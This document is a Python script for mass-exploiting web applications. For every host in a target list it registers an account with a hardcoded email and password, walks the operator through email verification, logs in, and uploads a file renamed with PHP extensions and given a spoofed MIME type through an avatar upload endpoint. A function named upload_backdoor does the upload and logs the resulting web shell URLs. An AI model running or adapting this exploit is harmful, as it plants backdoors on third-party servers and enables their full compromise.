import requests
import json
import os

# === Config ===
BASE_FILE = "bq.jpg"
EXTENSIONS = ["php", "phtml", "php3", "php5", "php7", "php56", "php74", "php83", "PHP", "PHTML"]
REGISTER_ENDPOINT = "/auth/register"
LOGIN_ENDPOINT = "/auth/login"
UPLOAD_ENDPOINT = "/api/v1/file-entries"
EMAIL = "yucaerin@hotmail.com"
PASSWORD = "123123123"

with open("list.txt") as f:
    targets = [x.strip() for x in f if x.strip()]

def upload_backdoor(session, base_url):
    xsrf = session.cookies.get("XSRF-TOKEN")
    headers = {
        "X-XSRF-TOKEN": xsrf,
        "Referer": f"{base_url}/account-settings",
        "Origin": base_url
    }

    for ext in EXTENSIONS:
        filename = BASE_FILE.replace(".jpg", "")
        new_name = f"{filename}.{ext}"

        with open(BASE_FILE, "rb") as f:
            file_content = f.read()

        files = {
            "file": (filename, file_content, f"image/jpeg.{ext}"),
            "clientMime": (None, f"image/jpeg.{ext}"),
            "clientExtension": (None, "jpg"),
            "diskPrefix": (None, "avatars"),
            "disk": (None, "public"),
            "relativePath": (None, ""),
            "parentId": (None, "")
        }

        try:
            upload = session.post(f"{base_url}{UPLOAD_ENDPOINT}", headers=headers, files=files)
            if upload.status_code == 201 and 'url' in upload.text:
                data = upload.json()
                file_url = f"{base_url}/{data['fileEntry']['url']}"
                print(f"✅ Upload successful: {file_url}")
                with open("result_upload.txt", "a") as log:
                    log.write(f"{file_url}\n")
            else:
                print(f"❌ Upload failed ({ext}) to {base_url}")
        except Exception as e:
            print(f"❌ Upload error ({ext}):", e)

for target in targets:
    if not target.startswith("http"):
        target = f"https://{target}"
    print(f"\n🌐 Target: {target}")

    try:
        session = requests.Session()
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Referer": f"{target}/register",
            "Origin": target
        }

        init = session.get(f"{target}/register", headers=headers, timeout=10)
        if "XSRF-TOKEN" not in session.cookies:
            print("❌ Failed to retrieve XSRF-TOKEN")
            continue

        xsrf_token = session.cookies.get("XSRF-TOKEN")
        headers["X-XSRF-TOKEN"] = xsrf_token
        data = {"email": EMAIL, "password": PASSWORD, "password_confirmation": PASSWORD}
        resp = session.post(f"{target}{REGISTER_ENDPOINT}", headers=headers, json=data, timeout=10)

        if resp.status_code == 422 and "already been taken" in resp.text:
            print("⚠️ Email is already registered.")
            answer = input("❓ Has the email been verified? (yes/no): ").strip().lower()
            if answer != "yes":
                continue
        elif resp.status_code == 200:
            if "application/json" in resp.headers.get("Content-Type", ""):
                j = resp.json()
            else:
                print(f"❌ Non-JSON response from {target}: {resp.text[:200]}")
                continue

            if j.get("status") == "needs_email_verification":
                print("🔐 Email verification required.")
                with open("result_needs_verification.txt", "a") as f:
                    f.write(f"{target}\n")

                method = input("❓ Is the verification via link or code? (link/code): ").strip().lower()
                if method == "link":
                    verif_url = input("🔗 Enter the email verification link: ").strip()
                    try:
                        verif_resp = session.get(verif_url, timeout=10)
                        if verif_resp.status_code == 200:
                            print("✅ Verification via link successful, continuing to login...")
                        else:
                            print(f"❌ Verification failed with status {verif_resp.status_code}")
                            continue
                    except Exception as e:
                        print(f"❌ Failed to access verification link: {e}")
                        continue
                elif method == "code":
                    otp_code = input("🔢 Enter the 6-digit verification code: ").strip()
                    otp_endpoint = f"{target}/api/v1/validate-email-verification-otp"
                    otp_headers = headers.copy()
                    otp_headers["Referer"] = f"{target}/dashboard"
                    payload = {"code": otp_code}
                    try:
                        otp_resp = session.post(otp_endpoint, headers=otp_headers, json=payload, timeout=10)
                        if otp_resp.status_code == 200 and "success" in otp_resp.text:
                            print("✅ Verification via code successful, continuing to login...")
                        else:
                            print(f"❌ Code verification failed with status {otp_resp.status_code}")
                            continue
                    except Exception as e:
                        print(f"❌ Error during code verification: {e}")
                        continue
                else:
                    print("❌ Invalid verification method.")
                    continue
            elif j.get("status") == "success":
                print("✅ Registration successful without verification.")
            else:
                print("⚠️ Unrecognized response.")
                continue
        else:
            print(f"❌ Registration failed: {resp.status_code}")
            continue

        # Login
        login_data = {"email": EMAIL, "password": PASSWORD}
        login_headers = headers.copy()
        login_headers["Referer"] = f"{target}/login"
        login = session.post(f"{target}{LOGIN_ENDPOINT}", headers=login_headers, json=login_data, timeout=10)
        if login.status_code == 200:
            print("🔓 Login successful, proceeding to upload...")
            upload_backdoor(session, target)
        else:
            print("❌ Login failed")

    except Exception as e:
        print("❌ Error:", e)
        continue
